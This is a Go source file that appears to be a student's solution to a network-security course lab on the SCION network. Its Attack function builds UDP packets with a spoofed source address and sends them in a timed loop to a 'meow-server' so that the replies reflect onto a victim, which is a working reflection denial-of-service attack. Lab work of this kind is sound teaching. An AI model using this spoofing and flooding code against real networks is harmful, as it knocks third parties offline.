package client

import (
	// All of these imports were used for the mastersolution

	"log"
	"net"

	// TODO uncomment any imports you need (go optimizes away unused imports)
	"context"
	"time"

	"ethz.ch/netsec/isl/handout/attack/server"
	"github.com/scionproto/scion/go/lib/addr"
	"github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/snet"
	"github.com/scionproto/scion/go/lib/sock/reliable"
)

func GenerateAttackPayload() []byte {
	// TODO: Amplification Task
	// Choose which request to send

	return []byte{1}
}

func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {

	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.

	// Context
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces

	// SCION dispatcher

	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)
	// SCION daemon

	sciondAddr := SCIONDAddress()
	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		log.Fatal(err)
	}

	LocalIA, err := sciondConn.LocalIA(ctx)
	if err != nil {
		log.Fatal(err)
	}

	MeowServerAddr, err := snet.ParseUDPAddr(meowServerAddr)
	if err != nil {
		return err
	}

	sciconnpath, err := sciondConn.Paths(ctx, spoofedAddr.IA, MeowServerAddr.IA, daemon.PathReqFlags{})
	if err != nil {
		return err
	}

	path := sciconnpath[0].Path()
	path.Reverse()
	sec_path := sciconnpath[0].Path()

	if len(sciconnpath) == 2 {
		sec_path = sciconnpath[1].Path()
		sec_path.Reverse()
	}

	packetconn, _, err := dispatcher.Register(ctx, LocalIA, &net.UDPAddr{IP: MeowServerAddr.Host.IP}, addr.SvcNone)
	if err != nil {
		return err
	}

	conn := snet.NewSCIONPacketConn(packetconn, snet.DefaultSCMPHandler{RevocationHandler: daemon.RevHandler{Connector: sciondConn}}, true)
	pkt := &snet.Packet{
		Bytes: make([]byte, server.MaxBufferSize),
		PacketInfo: snet.PacketInfo{
			Source: snet.SCIONAddress{
				IA:   spoofedAddr.IA,
				Host: addr.HostFromIP(spoofedAddr.Host.IP),
			},
			Destination: snet.SCIONAddress{
				IA:   MeowServerAddr.IA,
				Host: addr.HostFromIP(MeowServerAddr.Host.IP),
			},
			Path: path,
			Payload: snet.UDPPayload{
				SrcPort: uint16(spoofedAddr.Host.Port),
				DstPort: uint16(MeowServerAddr.Host.Port),
				Payload: payload,
			},
		},
	}
	sec_pkt := pkt
	if len(sciconnpath) == 2 {
		sec_pkt = &snet.Packet{
			Bytes: make([]byte, server.MaxBufferSize),
			PacketInfo: snet.PacketInfo{
				Source: snet.SCIONAddress{
					IA:   spoofedAddr.IA,
					Host: addr.HostFromIP(spoofedAddr.Host.IP),
				},
				Destination: snet.SCIONAddress{
					IA:   MeowServerAddr.IA,
					Host: addr.HostFromIP(MeowServerAddr.Host.IP),
				},
				Path: sec_path,
				Payload: snet.UDPPayload{
					SrcPort: uint16(spoofedAddr.Host.Port),
					DstPort: uint16(MeowServerAddr.Host.Port),
					Payload: payload,
				},
			},
		}
	}

	// TODO: Reflection Task
	// Set up a scion connection with the meow-server
	// and spoof the return address to reflect to the victim.
	// Don't forget to set the spoofed source port with your
	// personalized port to get feedback from the victims.

	for start := time.Now(); time.Since(start) < AttackDuration(); {
		conn.WriteTo(pkt, &net.UDPAddr{IP: MeowServerAddr.Host.IP, Port: DispatcherPort()})
		if len(sciconnpath) == 2 {
			conn.WriteTo(sec_pkt, &net.UDPAddr{IP: MeowServerAddr.Host.IP, Port: DispatcherPort()})
		}
	}
	return nil
}
